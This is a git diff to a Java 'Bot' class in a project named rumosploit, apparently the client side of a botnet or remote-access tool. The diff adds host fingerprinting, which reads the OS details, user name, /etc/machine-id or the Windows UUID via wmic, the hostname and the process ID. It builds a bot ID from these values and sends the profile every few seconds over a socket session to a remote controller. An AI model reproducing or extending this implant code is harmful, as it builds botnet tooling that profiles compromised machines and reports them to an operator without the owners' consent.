@@ -1,9 +1,14 @@
 package com.github.rumoel.rumosploit.bot;
 
+import java.io.BufferedReader;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.lang.invoke.MethodHandles;
+import java.lang.management.ManagementFactory;
 import java.net.InetSocketAddress;
+import java.nio.file.Files;
 
 import org.apache.mina.core.future.ConnectFuture;
 import org.apache.mina.core.session.IdleStatus;
@@ -55,7 +60,11 @@ public class Bot extends Thread {
 	private void startDataGetter() {
 		new Thread(() -> {
 			do {
-				setBotEntityData();
+				try {
+					setBotEntityData();
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
 				try {
 					Thread.sleep(3000);
 				} catch (Exception e) {
@@ -65,22 +74,72 @@ public class Bot extends Thread {
 		}, "OsdataGetter").start();
 	}
 
-	public void setBotEntityData() {
+	public void setBotEntityData() throws IOException {
 		BotEntity data = Header.getBotEntity();
 
+		// OS
 		data.setOsName(System.getProperty("os.name"));
 		data.setOsVersion(System.getProperty("os.version"));
 		data.setOsArch(System.getProperty("os.arch"));
 
+		// user
 		data.setOsUserName(System.getProperty("user.name"));
 
+		if (data.getMachineId() == null) {
+			// HARD
+			data.setMachineId(readID());
+			String pidHostName = ManagementFactory.getRuntimeMXBean().getName();
+			data.setHostName(pidHostName.split("@")[1]);
+
+			// PROCESS
+			int pid = Integer.parseInt(pidHostName.split("@")[0]);
+			data.setPid(pid);
+		}
+
+		data.setBotId(data.getMachineId() + ":" + data.getOsUserName() + ":" + data.getPid());
+	}
+
+	private String readID() throws IOException {
+		try {
+			File file1 = new File(new File(new File("/"), "etc"), "machine-id");
+			String string1 = Files.readAllLines(file1.toPath()).get(0);
+			if (!string1.isEmpty()) {
+				return string1;
+			}
+		} catch (Exception e) {
+			// IGNORE (try other)
+		}
+
+		// by process
+		try {
+			String id = null;
+			ProcessBuilder processBuilder = new ProcessBuilder("wmic", "csproduct", "get", "UUID");
+
+			Process process = processBuilder.start();
+			try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+				String line;
+				while ((line = reader.readLine()) != null) {
+					if (line.length() == 38 && !line.contains("UUID")) {
+						id = line.trim();
+						break;
+					}
+				}
+			}
+			return id;
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		// by process
+		return null;
 	}
 
 	private void startDataSender() {
 		new Thread(() -> {
 			do {
 				BotEntity data = Header.getBotEntity();
-				Header.getSession().write(data);
+				if (data.botId != null) {
+					Header.getSession().write(data);
+				}
 				try {
 					Thread.sleep(4000);
 				} catch (Exception e) {
@@ -120,7 +179,9 @@ public class Bot extends Thread {
 		ConnectFuture future = Header.getNioSocketConnector().connect(new InetSocketAddress(host, port));
 		future.awaitUninterruptibly();
 		Header.setSession(future.getSession());
-		Header.getSession().write(new ReadyPacket());
+
+		ReadyPacket ready = new ReadyPacket();
+		Header.getSession().write(ready);
 	}
 
 	public void reload() {
